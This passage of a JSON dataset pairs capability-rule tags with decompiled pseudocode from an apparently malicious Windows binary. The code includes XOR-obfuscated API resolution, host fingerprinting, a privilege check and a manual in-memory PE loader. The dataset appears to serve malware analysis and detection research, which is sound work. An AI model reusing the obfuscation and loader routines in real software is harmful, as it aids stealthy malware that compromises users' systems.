&hKey);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &var_30h, 0, 4, &var_ch, 4);\n                    if (iVar2 != 0) {\n                        var_ch = 0;\n                    }\n                }\n                else {\n                    var_ch = 0;\n                }\n            }\n            var_14h = var_14h ^ var_ch;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        lpString = var_1ch + 8;\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        var_28h = fcn.00420020(lpString, uVar1);\n        var_28h = var_28h ^ var_14h;\n        nSize = 0x10;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        lpBuffer = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(lpBuffer, &nSize);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpBuffer);\n        var_20h = fcn.00420020(lpBuffer, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpBuffer);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        *0x436b70 = var_28h;\n        *0x436b74 = var_20h;\n        *0x436b78 = var_28h ^ var_20h;\n        *0x436b7c = var_20h << 10 | var_20h >> 0x16;\n    }\n    return;\n}\n",
        "token_count": 2545
    },
    "0041e800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e800(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    *arg_10h = 0;\n    iVar1 = (*_sym.imp.NETAPI32.dll_NetUserGetInfo)(arg_8h, arg_ch, 3, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        *arg_10h = var_4h;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0041e850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e850(char *lpString, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char *arg_8h;\n    char *pcVar3;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    char *var_4h;\n    \n    var_10h = 0;\n    if (lpString != NULL) {\n        if (arg_ch == -1) {\n            arg_ch = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        }\n        iVar1 = fcn.0041b280(lpString, arg_ch, 0x5c);\n        if (iVar1 == 0) {\n            var_4h = lpString;\n            var_8h = arg_ch;\n        }\n        else {\n            var_4h = iVar1 + 1;\n            var_8h = arg_ch - (var_4h - lpString);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h + 1);\n        arg_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (arg_8h != NULL) {\n            iVar1 = var_8h;\n            pcVar3 = arg_8h;\n            if ((*var_4h == '\\\"') && (var_4h[var_8h + -1] == '\\\"')) {\n                var_8h = var_8h + -2;\n                for (iVar1 = var_8h; var_4h = var_4h + 1,  iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *pcVar3 = *var_4h;\n                    pcVar3 = pcVar3 + 1;\n                }\n                arg_8h[var_8h] = '\\0';\n            }\n            else {\n                for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *pcVar3 = *var_4h;\n                    var_4h = var_4h + 1;\n                    pcVar3 = pcVar3 + 1;\n                }\n                arg_8h[var_8h] = '\\0';\n            }\n            fcn.0041b390(arg_8h);\n            var_10h = fcn.0041ff90(arg_8h, var_8h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 589
    },
    "0041ea00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041ea00(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    uint nSize;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    *0x436b64 = arg_8h;\n    *0x436b80 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((arg_ch & 1) != 0) {\n        *0x436b6c = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    }\n    if ((arg_ch & 2) != 0) {\n        *0x436b48 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    }\n    fcn.0041c480();\n    fcn.0041e020();\n    if ((((arg_ch & 4) == 0) || (var_4h = fcn.0041c830(*0x436b64, 0x436b44),  var_4h == 0)) &&\n       (((arg_ch & 0x88) == 0 || (var_4h = fcn.0041c830(0, 0x436b68),  var_4h == 0)))) {\n        if ((arg_ch & 0x20) != 0) {\n            fcn.0041dbb0();\n        }\n        if (((arg_ch & 0x10) == 0) || (*0x436b58 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0),  *0x436b58 != 0))\n        {\n            if ((arg_ch & 0x40) != 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n                *0x436b8c = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (*0x436b8c != 0) {\n                    nSize = 0x10;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x436b8c, &nSize);\n                    if (iVar2 == 0) {\n                        var_28h._0_1_ = 7;\n                        var_28h._1_1_ = 0x58;\n                        var_28h._2_1_ = 0x7b;\n                        var_28h._3_1_ = 0x49;\n                        var_24h = 3;\n                        var_23h = 0x52;\n                        var_22h = 0x16;\n                        var_21h = 0x35;\n                        var_20h = 6;\n                        var_1fh = 0x48;\n                        var_1eh = 5;\n                        var_1dh = 0x58;\n                        var_1ch = 0x35;\n                        var_1bh = 0x49;\n                        var_18h[0] = 0x52;\n                        var_18h[1] = 0x58;\n                        var_18h[2] = 0x35;\n                        var_18h[3] = 0x49;\n                        var_14h = 0x48;\n                        fcn.004012a0(0x1c);\n                        for (var_8h = 0; var_8h < 0xe; var_8h = var_8h + 1) {\n                            fcn.00401280(var_8h, *(&var_28h + var_8h) ^ var_18h[var_8h % 5]);\n                        }\n                        uVar1 = fcn.00401270();\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x436b8c, uVar1);\n                        fcn.004012d0();\n                    }\n                    fcn.0041e480();\n                }\n            }\n            if ((arg_ch & 0x100) != 0) {\n                iVar2 = (*_sym.imp.SHELL32.dll_IsUserAnAdmin)();\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0041dbf0();\n                    if (iVar2 == 0) {\n                        *0x436b60 = 2;\n                    }\n                    else {\n                        *0x436b60 = 1;\n                    }\n                }\n                else if (((*0x436b6c & 0xff) < 6) || (iVar2 = fcn.0041e980(),  iVar2 != 0)) {\n                    *0x436b60 = 4;\n                }\n                else {\n                    *0x436b60 = 3;\n                }\n            }\n            if ((arg_ch & 0x200) != 0) {\n                if ((*0x436b6c & 0xff) < 6) {\n                    *0x436b84 = 2;\n                }\n                else {\n                    *0x436b84 = fcn.0041dc40(0xffffffff);\n                }\n            }\n            if ((arg_ch & 0x80) != 0) {\n                *0x436b90 = fcn.0041e3e0(*0x436b68, 0xffffffff);\n            }\n        }\n        else {\n            var_4h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n    }\n    if (var_4h != 0) {\n        fcn.0041dfc0();\n    }\n    return var_4h;\n}\n",
        "token_count": 1348
    },
    "0041ecf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ecf0(int32_t TokenHandle, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint psz1;\n    uint TokenInformationLength;\n    uint *TokenInformation;\n    \n    var_14h = 0x100;\n    var_18h = 0;\n    TokenInformationLength = 0;\n    *arg_ch = 0;\n    *arg_10h = 0;\n    TokenInformation = NULL;\n    if (TokenHandle == 0) goto code_r0x0041ee65;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &TokenInformationLength);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar1 != 0x7a) goto code_r0x0041ee65;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n        TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (TokenInformation == NULL) goto code_r0x0041ee65;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                      (TokenHandle, 1, TokenInformation, TokenInformationLength, &TokenInformationLength);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x200);\n        psz1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                          (0, *TokenInformation, psz1, &var_14h, var_10h, &var_14h, &var_20h);\n        if (iVar1 == 0) {\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (var_1ch == 0x534) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, L\"NONE_MAPPED\");\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, psz1);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        else {\n            *arg_ch = psz1;\n            *arg_10h = var_10h;\n            var_18h = 1;\n        }\n    }\ncode_r0x0041ee65:\n    if (TokenInformation != NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformation);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return var_18h;\n}\n",
        "token_count": 762
    },
    "0041ee90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.0041ee90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uchar *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_5ch._0_1_ = 0x20;\n    var_5ch._1_1_ = 0x6a;\n    var_5ch._2_1_ = 0x13;\n    var_5ch._3_1_ = 0x4c;\n    var_58h = 4;\n    var_57h = 0x41;\n    var_56h = 0xe;\n    var_55h = 0x71;\n    var_54h = 0x29;\n    var_53h = 0x67;\n    var_52h = 0x27;\n    var_51h = 0x6a;\n    var_50h = 0x16;\n    var_4fh = 0x4c;\n    var_4eh = 0xf;\n    var_4dh = 0x41;\n    var_4ch = 3;\n    var_4bh = 0x71;\n    var_4ah = 0x26;\n    var_49h = 0x67;\n    var_48h = 0x2a;\n    var_47h = 0x6a;\n    var_46h = 0x1d;\n    var_45h = 0x4c;\n    var_44h = 10;\n    var_43h = 0x41;\n    var_42h = 4;\n    var_41h = 0x71;\n    var_40h = 0x23;\n    var_3fh = 0x67;\n    var_3eh = 0x31;\n    var_3dh = 0x6a;\n    var_3ch = 0;\n    var_3bh = 0x4c;\n    var_3ah = 0x15;\n    var_39h = 0x41;\n    var_38h = 0x19;\n    var_37h = 0x71;\n    var_36h = 0x38;\n    var_35h = 0x67;\n    var_34h = 0x34;\n    var_33h = 0x6a;\n    var_32h = 7;\n    var_31h = 0x4c;\n    var_30h = 0x10;\n    var_2fh = 0x41;\n    var_2eh = 0x12;\n    var_2dh = 0x71;\n    var_2ch = 0x35;\n    var_2bh = 0x67;\n    var_2ah = 0x3b;\n    var_29h = 0x6a;\n    var_28h = 0x71;\n    var_27h = 0x4c;\n    var_24h[0] = 0x41;\n    var_24h[1] = 0x6a;\n    var_24h[2] = 0x71;\n    var_24h[3] = 0x4c;\n    var_20h = 0x67;\n    fcn.004012a0(0x6c);\n    for (var_4h = 0; var_4h < 0x36; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_5ch + var_4h) ^ var_24h[var_4h % 5]);\n    }\n    uVar1 = fcn.0041f090();\n    var_8h = uVar1 % (arg_ch - arg_8h) + arg_8h;\n    if (var_8h != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h * 2 + 2);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_ch != NULL) {\n            puVar4 = var_ch;\n            for (iVar3 = var_8h * 2 + 2; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            for (var_10h = 0; var_10h < var_8h; var_10h = var_10h + 1) {\n                var_18h = fcn.0041f090();\n                var_18h = var_18h % 0x1a;\n                iVar3 = fcn.00401270();\n                *(var_ch + var_10h * 2) = *(iVar3 + var_18h * 2);\n            }\n            *(var_ch + var_8h * 2) = 0;\n        }\n    }\n    var_1ch = var_ch;\n    fcn.004012d0();\n    return var_1ch;\n}\n",
        "token_count": 1595
    },
    "0041f090": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0041f090(void)\n\n{\n    uint uVar1;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint var_20h;\n    uchar var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h._0_1_ = 0x31;\n    var_34h._1_1_ = 0x52;\n    var_34h._2_1_ = 0x3b;\n    var_34h._3_1_ = 0x36;\n    var_30h = 0x1d;\n    var_2fh = 0x39;\n    var_2eh = 5;\n    var_2dh = 0x7f;\n    var_2ch = 0x57;\n    var_20h._0_1_ = 0x50;\n    var_20h._1_1_ = 0x36;\n    var_20h._2_1_ = 0x4d;\n    var_20h._3_1_ = 0x57;\n    var_1ch = 0x6d;\n    fcn.004012a0(9);\n    for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_34h + var_4h) ^ *(&var_20h + var_4h % 5));\n    }\n    if (*0x436b94 == NULL) {\n        var_48h._0_1_ = 0x34;\n        var_48h._1_1_ = 0x4a;\n        var_48h._2_1_ = 0x42;\n        var_48h._3_1_ = 0x1f;\n        var_44h = 0x24;\n        var_43h = 0x5e;\n        var_42h = 0x21;\n        var_41h = 0x46;\n        var_40h = 0x5f;\n        var_3fh = 8;\n        var_3eh = 0x35;\n        var_3dh = 0x5a;\n        var_3ch = 8;\n        var_3bh = 0x5d;\n        var_3ah = 1;\n        var_39h = 0x58;\n        var_38h = 0x77;\n        var_37h = 0x33;\n        var_28h._0_1_ = 0x67;\n        var_28h._1_1_ = 0x33;\n        var_28h._2_1_ = 0x31;\n        var_28h._3_1_ = 0x6b;\n        var_24h = 0x41;\n        var_23h = 0x33;\n        fcn.004012a0(0x12);\n        for (var_8h = 0; var_8h < 0x12; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_48h + var_8h) ^ *(&var_28h + var_8h % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n        *0x436b94 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n    }\n    (**0x436b94)(&var_ch, 4);\n    if (var_ch < 0) {\n        var_ch = -var_ch;\n    }\n    var_18h = var_ch;\n    fcn.004012d0();\n    return var_18h;\n}\n",
        "token_count": 1094
    },
    "0041f240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041f240(code **arg_8h)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    code *var_64h;\n    code *var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    code *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    code *var_20h;\n    code **var_1ch;\n    code *var_18h;\n    code **var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h[0xc];\n    if (var_8h == NULL) {\n        (**arg_8h)(0, 0, arg_8h + 0xe, &var_70h);\n    }\n    else {\n        var_10h = 0;\n        var_20h = var_8h + *(var_8h + 0x3c);\n        var_18h = var_20h + *(var_20h + 0x14) + 0x18;\n        var_58h = *(var_20h + 6);\n        var_4ch = 0;\n        var_6ch = 0;\n        var_3ch = *(var_20h + 0x80);\n        if (var_3ch != 0) {\n            for (var_24h = var_8h + var_3ch; var_24h[3] != 0; var_24h = var_24h + 5) {\n                var_ch = 0;\n                var_40h = var_8h + var_24h[3];\n                for (; var_40h[var_ch] != 0x0; var_ch = var_ch + 1) {\n                    *(arg_8h + var_ch * 2 + 0x840) = var_40h[var_ch];\n                }\n                *(arg_8h + 0xe) = var_ch << 1;\n                *(arg_8h + 0x3a) = var_ch * 2 + 2;\n                arg_8h[0xf] = arg_8h + 0x210;\n                var_10h = (**arg_8h)(0, 0, arg_8h + 0xe, &var_4ch);\n                if (var_10h < 0) {\n                    var_10h = -0x3ffffc91;\n                    break;\n                }\n                var_2ch = *var_24h;\n                var_44h = var_24h[4];\n                var_50h = NULL;\n                var_4h._0_2_ = 0;\n                if (var_2ch == 0) {\n                    var_2ch = var_44h;\n                }\n                if (var_2ch != 0) {\n                    var_30h = var_8h + var_44h;\n                    for (var_14h = var_8h + var_2ch; *var_14h != NULL; var_14h = var_14h + 1) {\n                        var_48h = (*var_14h & 0x80000000) != 0;\n                        if (var_48h == 0) {\n                            var_1ch = var_8h + *var_14h;\n                        }\n                        else if ((*var_14h < var_8h) || (var_8h + *(var_20h + 0x50) <= *var_14h)) {\n                            var_1ch = NULL;\n                            var_4h._0_2_ = SUB42(*var_14h, 0);\n                        }\n                        else {\n                            var_1ch = *var_14h;\n                        }\n                        if (var_1ch != NULL) {\n                            for (var_ch = 0; *(var_1ch + var_ch + 2) != 0x0; var_ch = var_ch + 1) {\n                            }\n                            *(arg_8h + 0xe) = var_ch;\n                            *(arg_8h + 0x3a) = var_ch + 1;\n                            arg_8h[0xf] = var_1ch + 2;\n                            var_1ch = arg_8h + 0xe;\n                        }\n                        var_10h = (*arg_8h[2])(var_4ch, var_1ch, var_4h, &var_54h);\n                        if (var_10h < 0) {\n                            var_10h = -0x3fffff86;\n                            break;\n                        }\n                        var_50h = var_30h;\n                        *var_30h = var_54h;\n                        var_30h = var_30h + 1;\n                    }\n                }\n            }\n        }\n        if (-1 < var_10h) {\n            var_38h = *(var_20h + 0x54);\n            var_10h = (*arg_8h[4])(0xffffffff, &var_8h, &var_38h, 4, &var_5ch);\n            var_34h = 0;\n            while ((var_34h < var_58h && (-1 < var_10h))) {\n                if ((*(var_18h + 0x24) & 0x20000000) == 0) {\n                    if ((*(var_18h + 0x24) & 0x40000000) == 0) {\n                        var_28h = 4;\n                    }\n                    else if ((*(var_18h + 0x24) & 0x80000000) == 0) {\n                        var_28h = 2;\n                    }\n                    else {\n                        var_28h = 4;\n                    }\n                }\n                else if ((*(var_18h + 0x24) & 0x80000000) == 0) {\n                    var_28h = 0x20;\n                }\n                else {\n                    var_28h = 0x40;\n                }\n                var_38h = *(var_18h + 8);\n                var_60h = var_8h + *(var_18h + 0xc);\n                var_10h = (*arg_8h[4])(0xffffffff, &var_60h, &var_38h, var_28h, &var_5ch);\n                var_18h = var_18h + 0x28;\n                var_34h = var_34h + 1;\n            }\n            if (-1 < var_10h) {\n                var_64h = var_8h + *(var_20h + 0x28);\n                (*var_64h)(var_8h, 1, arg_8h + 6);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1640
    },
    "0041f630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041f630(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uint8_t var_48h [4];\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uint8_t var_34h [4];\n    uchar var_30h;\n    code *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = -0x3fffffdd;\n    var_10h = 0;\n    var_18h = 0;\n    if ((((arg_8h != NULL) && (arg_ch != NULL)) && (*arg_8h != 0)) && (arg_8h[1] != 0)) {\n        var_ch = arg_8h[1];\n        if (*arg_8h == *var_ch) {\n            var_5ch._0_1_ = 5;\n            var_5ch._1_1_ = 0x3d;\n            var_5ch._2_1_ = 7;\n            var_5ch._3_1_ = 0x35;\n            var_58h = 0x57;\n            var_57h = 0xe;\n            var_56h = 0x38;\n            var_55h = 0x24;\n            var_54h = 0x1b;\n            var_53h = 3;\n            var_52h = 0x57;\n            var_51h = 0x1e;\n            var_50h = 0x24;\n            var_4fh = 0xb;\n            var_4eh = 0x1e;\n            var_4dh = 0x17;\n            var_4ch = 0x54;\n            var_4bh = 8;\n            var_4ah = 0x25;\n            var_49h = 0x49;\n            var_3ch._0_1_ = 0x57;\n            var_3ch._1_1_ = 0x49;\n            var_3ch._2_1_ = 0x6b;\n            var_3ch._3_1_ = 0x71;\n            var_38h = 0x32;\n            var_37h = 0x6d;\n            fcn.004012a0(0x14);\n            for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n                fcn.00401280(var_4h, *(&var_5ch + var_4h) ^ *(&var_3ch + var_4h % 6));\n            }\n            var_48h[0] = 0x27;\n            var_48h[1] = 0x1f;\n            var_48h[2] = 5;\n            var_48h[3] = 1;\n            var_44h = 0x3d;\n            var_43h = 0x67;\n            var_42h = 0xf;\n            var_41h = 0xd;\n            var_40h = 1;\n            var_3fh = 0x51;\n            var_34h[0] = 0x49;\n            var_34h[1] = 0x6b;\n            var_34h[2] = 0x61;\n            var_34h[3] = 0x6d;\n            var_30h = 0x51;\n            fcn.004012a0(10);\n            for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, var_48h[var_8h] ^ var_34h[var_8h % 5]);\n            }\n            uVar1 = fcn.00401270();\n            uVar1 = fcn.00401270(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n            var_2ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_ch[1]);\n            var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_28h = arg_8h[1] + 0xc;\n            var_24h = *var_ch + -0xc;\n            fcn.004230a0(var_28h, var_24h);\n            var_14h = (*var_2ch)(2, var_10h, var_ch[1], var_28h, var_24h, &var_18h);\n            if (var_14h == 0) {\n                if (var_18h == var_ch[1]) {\n                    arg_ch[1] = var_10h;\n                    *arg_ch = var_18h;\n                }\n                else {\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_14h = -0x3fffff85;\n                }\n            }\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        else {\n            var_14h = -0x3fffff85;\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 1491
    },
    "0041ff90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
